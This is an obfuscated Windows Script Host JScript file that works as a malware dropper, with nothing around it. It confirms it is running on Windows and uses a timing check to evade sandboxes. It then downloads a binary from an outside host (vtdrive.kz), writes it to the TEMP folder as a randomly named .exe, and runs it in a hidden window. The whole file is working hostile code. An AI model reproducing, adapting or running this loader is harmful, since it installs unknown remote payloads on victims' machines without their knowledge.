var Z = false;
var L = "Create"+"Object";
var K0 = function K() {return WScript[L]("WScript"+".Shell");}(), BU = 11;
var V = "MSXML2"+".XMLHTTP";
var VW = 2;
var PX = VW - 2;
function IA(X){K0["Run"](X, PX, PX);};
function J(){return V + "";};
function I(ZY, P){PX = PX * 1; return ZY - P;};
function NP(){return L;};
/*@cc_on
  @if (@_win32 || @_win64)
    Z = true;
  @end
@*/
if (Z)
{
var C = "";
function BZ(){return 22;};
var LG = 0; var W = 0;
function H()
{
var U1 = new this["Date"]();
var O = U1["getUTCMilliseconds"]();
WScript["Sleep"](BZ());
var U1 = new this["Date"]();
var U0 = U1["getUTCMilliseconds"]();
WScript["Sleep"](BZ());
var U1 = new this["Date"]();
var N0 = U1["getUTCMilliseconds"]();
var LG = "R";
LG = I(U0, O);
var W = "U";
W = I(N0, U0);
C = "open";
return I(LG, W);
}
var QE = false;
var D = false;
for (var M = PX; M < BZ() * 1; M++){if (H() != PX){
QE = true; 
W = "31" + 11 * LG + W; 
D = true; 
break;
}}
function NN() {return ((QE == true) && (QE == D)) ? 1 : PX;};
if (QE && NN() && D){
function N() {return K0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Nqahj0kAytZF1lkQ.ex" + "e";};
 CK = J();
 TL = WScript[L](CK);
 var C0 = 1;
do { 
	for (;C0;){
	try {
		if (C0 == 1)
		{
			TL[C]("GET", "http://vtdrive.kz/f6dh1a", false);
			TL["send"]();
			VI = "Sleep";
			C0 = 2;
		}
		WScript[VI](BZ() + 120); 
		if (TL["readystate"] < 2 * 2) continue;
		C0 = PX;
		function HO(EI) {var DK = (1, 2, 3, 4, 5, EI); return DK;};
		KC = WScript[NP()]("ADODB.Stream");
		CK = KC;
		CK[C]();
		CK["type"] = HO(1);
		CK["write"](TL["ResponseBody"]);
		KC["position"] = HO(PX);
		CK["Save" + "ToFile"](N(), 2);
		KC["cl"+"ose"]();
		KX = N();
		IA(KX);
	} catch(RI){};};
}while (C0);
}
}

